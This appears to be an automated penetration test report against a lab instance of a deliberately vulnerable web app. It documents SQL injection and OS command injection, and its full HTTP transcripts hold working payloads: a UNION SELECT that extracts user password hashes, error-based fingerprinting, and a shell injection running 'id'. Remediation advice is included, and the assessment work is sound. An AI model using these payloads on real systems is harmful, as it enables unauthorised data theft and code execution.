# Penetration Test Report - 20261116-015058-192.168.223.221

- **Target:** `192.168.223.221` (20261116-015058-192.168.223.221)
- **Date:** 2026-11-16 01:50:58
- **Duration:** 123.1s
- **Agent model:** probe-driver
- **Argus version:** 1.0.0
- **Requests sent:** 18

## Executive summary

Probe-driven run: the operator named the endpoints; the probes, the evidence gate and this report are the system's own.

| Severity | Count |
|---|---|
| Critical | 2 |

| Proof grade | Count | Meaning |
|---|---|---|
| **proven** | 2 | the class-specific artifact and its control are on record |

| OWASP Top 10 (2021) | Findings |
|---|---|
| A03 Injection | F01, F02 |

## Engagement constraints

- **Scope hosts:** (target only)
- **Excluded paths:** none
- **Budgets:** ? turns, ? requests, ? rps
- **Proxy:** no · **TLS verify:** no
- **Tool surface:** all


## Findings

### F01 - SQL injection in /vulnerabilities/sqli id parameter

- **Severity:** Critical
- **Category:** sqli · **proof: proven**
- **CWE:** `CWE-89`
- **OWASP:** A03 Injection
- **Endpoint:** `http://192.168.223.221:8081`
- **Evidence:** r1, r2, r3, r4, r5, r6, r7, r8, r9, r10, r11, r12, r13, r14, r15

**Description**  
SQL injection via the `id` parameter: the DBMS names itself in the error channel and a bounded UNION read returns rows from `users`.

**Proof (verbatim excerpt)**  
```
5f4dcc3b5aa765d61d8327deb882cf99
```

**Remediation**  
Use parameterised queries; never concatenate request values into SQL.

**Proof grade: proven**  

_Requirement for sqli:_ the DBMS fingerprint plus at least one row from a named table, bounded to what proves the read

- [x] proof read from the wire
- [x] the target produced the quoted bytes - from r15
- [x] data store fingerprinted - You have an error in your SQL syntax in r2
- [x] the query named its target - users in r15
- [x] the rows are not what the page serves anyway - 5f4dcc3b5aa765d61d8327deb882cf99 in r15 and in no control
- [x] rows returned, not an error message - quoted from r15
- [x] extraction stayed minimal

<details><summary>Transcript r1: GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1&amp;Submit=Submit -> 200</summary>

```http
GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1&Submit=Submit
host: 192.168.223.221:8081
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security=•••redacted•••

HTTP/200
date: Mon, 16 Nov 2026 06:50:59 GMT
server: Apache/2.4.25 (Debian)
expires: Tue, 23 Jun 2009 12:00:00 GMT
cache-control: no-cache, must-revalidate
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 1441
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: text/html;charset=utf-8


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">

	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

		<title>Vulnerability: SQL Injection :: Damn Vulnerab
```
</details>

<details><summary>Transcript r2: GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1%27&amp;Submit=Submit -> 200</summary>

```http
GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1%27&Submit=Submit
host: 192.168.223.221:8081
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security=•••redacted•••

HTTP/200
date: Mon, 16 Nov 2026 06:50:59 GMT
server: Apache/2.4.25 (Debian)
expires: Thu, 19 Nov 1981 08:52:00 GMT
cache-control: no-store, no-cache, must-revalidate
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 144
keep-alive: timeout=5, max=99
connection: Keep-Alive
content-type: text/html; charset=UTF-8

<pre>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1</pre>
```
</details>

<details><summary>Transcript r3: GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1%27+AND+%271%27%3D%271&amp;Submit=Submit -> 200</summary>

```http
GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1%27+AND+%271%27%3D%271&Submit=Submit
host: 192.168.223.221:8081
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security=•••redacted•••

HTTP/200
date: Mon, 16 Nov 2026 06:50:59 GMT
server: Apache/2.4.25 (Debian)
expires: Tue, 23 Jun 2009 12:00:00 GMT
cache-control: no-cache, must-revalidate
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 1451
keep-alive: timeout=5, max=98
connection: Keep-Alive
content-type: text/html;charset=utf-8


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">

	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

		<title>Vulnerability: SQL Injection :: Damn Vulnerab
```
</details>

<details><summary>Transcript r4: GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1%27+AND+%271%27%3D%272&amp;Submit=Submit -> 200</summary>

```http
GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1%27+AND+%271%27%3D%272&Submit=Submit
host: 192.168.223.221:8081
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security=•••redacted•••

HTTP/200
date: Mon, 16 Nov 2026 06:50:59 GMT
server: Apache/2.4.25 (Debian)
expires: Tue, 23 Jun 2009 12:00:00 GMT
cache-control: no-cache, must-revalidate
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 1420
keep-alive: timeout=5, max=97
connection: Keep-Alive
content-type: text/html;charset=utf-8


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">

	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

		<title>Vulnerability: SQL Injection :: Damn Vulnerab
```
</details>

<details><summary>Transcript r5: GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1+AND+1%3D1&amp;Submit=Submit -> 200</summary>

```http
GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1+AND+1%3D1&Submit=Submit
host: 192.168.223.221:8081
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security=•••redacted•••

HTTP/200
date: Mon, 16 Nov 2026 06:50:59 GMT
server: Apache/2.4.25 (Debian)
expires: Tue, 23 Jun 2009 12:00:00 GMT
cache-control: no-cache, must-revalidate
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 1448
keep-alive: timeout=5, max=96
connection: Keep-Alive
content-type: text/html;charset=utf-8


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">

	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

		<title>Vulnerability: SQL Injection :: Damn Vulnerab
```
</details>

<details><summary>Transcript r6: GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1+AND+1%3D2&amp;Submit=Submit -> 200</summary>

```http
GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1+AND+1%3D2&Submit=Submit
host: 192.168.223.221:8081
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security=•••redacted•••

HTTP/200
date: Mon, 16 Nov 2026 06:50:59 GMT
server: Apache/2.4.25 (Debian)
expires: Tue, 23 Jun 2009 12:00:00 GMT
cache-control: no-cache, must-revalidate
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 1448
keep-alive: timeout=5, max=95
connection: Keep-Alive
content-type: text/html;charset=utf-8


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">

	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

		<title>Vulnerability: SQL Injection :: Damn Vulnerab
```
</details>

<details><summary>Transcript r7: GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&amp;Submit=Submit -> 200</summary>

```http
GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit
host: 192.168.223.221:8081
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security=•••redacted•••

HTTP/200
date: Mon, 16 Nov 2026 06:50:59 GMT
server: Apache/2.4.25 (Debian)
expires: Tue, 23 Jun 2009 12:00:00 GMT
cache-control: no-cache, must-revalidate
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 1502
keep-alive: timeout=5, max=94
connection: Keep-Alive
content-type: text/html;charset=utf-8


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">

	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

		<title>Vulnerability: SQL Injection :: Damn Vulnerab
```
</details>

<details><summary>Transcript r8: GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%272&amp;Submit=Submit -> 200</summary>

```http
GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%272&Submit=Submit
host: 192.168.223.221:8081
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security=•••redacted•••

HTTP/200
date: Mon, 16 Nov 2026 06:50:59 GMT
server: Apache/2.4.25 (Debian)
expires: Tue, 23 Jun 2009 12:00:00 GMT
cache-control: no-cache, must-revalidate
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 1451
keep-alive: timeout=5, max=93
connection: Keep-Alive
content-type: text/html;charset=utf-8


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">

	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

		<title>Vulnerability: SQL Injection :: Damn Vulnerab
```
</details>

<details><summary>Transcript r9: GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1+OR+1%3D1&amp;Submit=Submit -> 200</summary>

```http
GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1+OR+1%3D1&Submit=Submit
host: 192.168.223.221:8081
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security=•••redacted•••

HTTP/200
date: Mon, 16 Nov 2026 06:50:59 GMT
server: Apache/2.4.25 (Debian)
expires: Tue, 23 Jun 2009 12:00:00 GMT
cache-control: no-cache, must-revalidate
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 1447
keep-alive: timeout=5, max=92
connection: Keep-Alive
content-type: text/html;charset=utf-8


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">

	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

		<title>Vulnerability: SQL Injection :: Damn Vulnerab
```
</details>

<details><summary>Transcript r10: GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1+OR+1%3D2&amp;Submit=Submit -> 200</summary>

```http
GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1+OR+1%3D2&Submit=Submit
host: 192.168.223.221:8081
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security=•••redacted•••

HTTP/200
date: Mon, 16 Nov 2026 06:50:59 GMT
server: Apache/2.4.25 (Debian)
expires: Tue, 23 Jun 2009 12:00:00 GMT
cache-control: no-cache, must-revalidate
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 1448
keep-alive: timeout=5, max=91
connection: Keep-Alive
content-type: text/html;charset=utf-8


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">

	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

		<title>Vulnerability: SQL Injection :: Damn Vulnerab
```
</details>

<details><summary>Transcript r11: GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1%27+AND+extractvalue%281%2Cconcat%280x7e%2Cversion%28%29%29%29--+-&amp;Submit=Submit -> 200</summary>

```http
GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1%27+AND+extractvalue%281%2Cconcat%280x7e%2Cversion%28%29%29%29--+-&Submit=Submit
host: 192.168.223.221:8081
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security=•••redacted•••

HTTP/200
date: Mon, 16 Nov 2026 06:50:59 GMT
server: Apache/2.4.25 (Debian)
expires: Thu, 19 Nov 1981 08:52:00 GMT
cache-control: no-store, no-cache, must-revalidate
pragma: no-cache
content-length: 58
keep-alive: timeout=5, max=90
connection: Keep-Alive
content-type: text/html; charset=UTF-8

<pre>XPATH syntax error: '~10.1.26-MariaDB-0+deb9u1'</pre>
```
</details>

<details><summary>Transcript r12: GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1%27+ORDER+BY+1--+-&amp;Submit=Submit -> 200</summary>

```http
GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1%27+ORDER+BY+1--+-&Submit=Submit
host: 192.168.223.221:8081
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security=•••redacted•••

HTTP/200
date: Mon, 16 Nov 2026 06:50:59 GMT
server: Apache/2.4.25 (Debian)
expires: Tue, 23 Jun 2009 12:00:00 GMT
cache-control: no-cache, must-revalidate
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 1455
keep-alive: timeout=5, max=89
connection: Keep-Alive
content-type: text/html;charset=utf-8


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">

	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

		<title>Vulnerability: SQL Injection :: Damn Vulnerab
```
</details>

<details><summary>Transcript r13: GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1%27+ORDER+BY+2--+-&amp;Submit=Submit -> 200</summary>

```http
GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1%27+ORDER+BY+2--+-&Submit=Submit
host: 192.168.223.221:8081
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security=•••redacted•••

HTTP/200
date: Mon, 16 Nov 2026 06:50:59 GMT
server: Apache/2.4.25 (Debian)
expires: Tue, 23 Jun 2009 12:00:00 GMT
cache-control: no-cache, must-revalidate
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 1455
keep-alive: timeout=5, max=88
connection: Keep-Alive
content-type: text/html;charset=utf-8


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">

	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

		<title>Vulnerability: SQL Injection :: Damn Vulnerab
```
</details>

<details><summary>Transcript r14: GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1%27+ORDER+BY+3--+-&amp;Submit=Submit -> 200</summary>

```http
GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1%27+ORDER+BY+3--+-&Submit=Submit
host: 192.168.223.221:8081
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security=•••redacted•••

HTTP/200
date: Mon, 16 Nov 2026 06:50:59 GMT
server: Apache/2.4.25 (Debian)
expires: Thu, 19 Nov 1981 08:52:00 GMT
cache-control: no-store, no-cache, must-revalidate
pragma: no-cache
content-length: 47
keep-alive: timeout=5, max=87
connection: Keep-Alive
content-type: text/html; charset=UTF-8

<pre>Unknown column '3' in 'order clause'</pre>
```
</details>

<details><summary>Transcript r15: GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2C+password+FROM+users+LIMIT+5--+-&amp;Submit=Submit -> 200</summary>

```http
GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2C+password+FROM+users+LIMIT+5--+-&Submit=Submit
host: 192.168.223.221:8081
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security=•••redacted•••

HTTP/200
date: Mon, 16 Nov 2026 06:50:59 GMT
server: Apache/2.4.25 (Debian)
expires: Tue, 23 Jun 2009 12:00:00 GMT
cache-control: no-cache, must-revalidate
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 1635
keep-alive: timeout=5, max=86
connection: Keep-Alive
content-type: text/html;charset=utf-8

<pre>ID: 1' UNION SELECT user, password FROM users LIMIT 5-- -<br />First name: admin<br />Surname: 5f4dcc3b5aa765d61d8327deb882cf99</pre><pre>ID: 1' UNION SELECT user, password FROM users LIMIT 5-- -<br />First name: gordonb<br />Surname: e99a18c428cb38d5f260853678922e03</pre><pre>ID: 1' UNION SELECT user, password FROM users LIMIT 5-- -<br />First name: 1337<br />Surname: 8d3533d75ae2c3966d7e0d4fcc69216b</pre><pre>ID: 1' UNION
```
</details>

### F02 - OS command injection in /vulnerabilities/exec ip parameter

- **Severity:** Critical
- **Category:** rce · **proof: proven**
- **CWE:** `CWE-78`
- **OWASP:** A03 Injection
- **Endpoint:** `http://192.168.223.221:8081`
- **Evidence:** r16, r17, r18

**Description**  
The `ip` field reaches a shell: `id` output came back with this probe's own nonce, proving execution rather than reflection.

**Proof (verbatim excerpt)**  
```
uid=33(www-data)
```

**Remediation**  
Never pass request values to a shell; use argv and an allowlist.

**Proof grade: proven**  

_Requirement for rce:_ the output of `id; echo <nonce>` returned by the target, with the nonce tying the output to the probe

- [x] proof read from the wire
- [x] the target produced the quoted bytes - from r18
- [x] a benign command was sent - exchange r18
- [x] identity output returned by the target - 'uid=33(www-data)' in r18
- [x] the quoted bytes are the command output - 'uid=33(www-data)' carries the identity line
- [x] the probe nonce came back in the output - 'arguspaobml3w' in r18
- [x] proof command stayed benign

<details><summary>Transcript r16: POST http://192.168.223.221:8081/vulnerabilities/exec/ -> 200</summary>

```http
POST http://192.168.223.221:8081/vulnerabilities/exec/
host: 192.168.223.221:8081
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security=•••redacted•••
content-type: application/x-www-form-urlencoded
content-length: 26

ip=127.0.0.1&Submit=Submit

HTTP/200
date: Mon, 16 Nov 2026 06:52:51 GMT
server: Apache/2.4.25 (Debian)
expires: Tue, 23 Jun 2009 12:00:00 GMT
cache-control: no-cache, must-revalidate
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 1545
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: text/html;charset=utf-8


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">

	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

		<title>Vulnerability: Command Injection :: Damn Vuln
```
</details>

<details><summary>Transcript r17: POST http://192.168.223.221:8081/vulnerabilities/exec/ -> 200</summary>

```http
POST http://192.168.223.221:8081/vulnerabilities/exec/
host: 192.168.223.221:8081
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security=•••redacted•••
content-type: application/x-www-form-urlencoded
content-length: 26

ip=127.0.0.2&Submit=Submit

HTTP/200
date: Mon, 16 Nov 2026 06:52:54 GMT
server: Apache/2.4.25 (Debian)
expires: Tue, 23 Jun 2009 12:00:00 GMT
cache-control: no-cache, must-revalidate
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 1546
keep-alive: timeout=5, max=99
connection: Keep-Alive
content-type: text/html;charset=utf-8


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">

	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

		<title>Vulnerability: Command Injection :: Damn Vuln
```
</details>

<details><summary>Transcript r18: POST http://192.168.223.221:8081/vulnerabilities/exec/ -> 200</summary>

```http
POST http://192.168.223.221:8081/vulnerabilities/exec/
host: 192.168.223.221:8081
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security=•••redacted•••
content-type: application/x-www-form-urlencoded
content-length: 54

ip=127.0.0.1%3B+id%3B+echo+arguspaobml3w&Submit=Submit

HTTP/200
date: Mon, 16 Nov 2026 06:52:57 GMT
server: Apache/2.4.25 (Debian)
expires: Tue, 23 Jun 2009 12:00:00 GMT
cache-control: no-cache, must-revalidate
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 1578
keep-alive: timeout=5, max=98
connection: Keep-Alive
content-type: text/html;charset=utf-8

tted, 4 packets received, 0% packet loss
round-trip min/avg/max/stddev = 0.052/0.129/0.316/0.109 ms
uid=33(www-data) gid=33(www-data) groups=33(www-data)
arguspaobml3w
</pre>
	</div>

	<h2>More Information</h2>
	<ul>
		<li><a href="http://www.scribd.com/doc/2530476/Php-Endangers-Remote-Code-Execution" target="_blank">http://www.scribd.com/doc/2530476/Php-Endangers-Remote-Code-Execution</a></li>
		<li><a hre
```
</details>


## Test coverage

| Tool | Requests |
|---|---|
| probe_cmdi | 3 |
| probe_sqli | 15 |

**Probe families run:** probe_cmdi, probe_sqli

**Endpoints exercised (2):**

- `GET /vulnerabilities/sqli/?Submit&id`
- `POST /vulnerabilities/exec/`

## Methodology

Autonomous agent run: recon (fingerprint, crawl, js_recon) -> input
mapping -> hypothesis-driven probes (matched true/false pairs,
baseline-diffed) -> verification -> evidence-gated findings.
The complete request/response transcript is in `transcript.jsonl`,
(18 entries). Working notes are in `notes.md`.

Every finding is graded against the proof requirement for its class
(`argus proof <class>`): **proven** means the class-specific artifact
and its control are both on record; **candidate** means a real signal
with a named check still missing. A candidate is reported because it
is worth re-testing, not because it is a result.

_All findings cite verbatim response excerpts verified against the
recorded transcript at write time._

<details><summary>Appendix: agent working notes (audit)</summary>

```
# Working notes - http://192.168.223.221:8081


```
</details>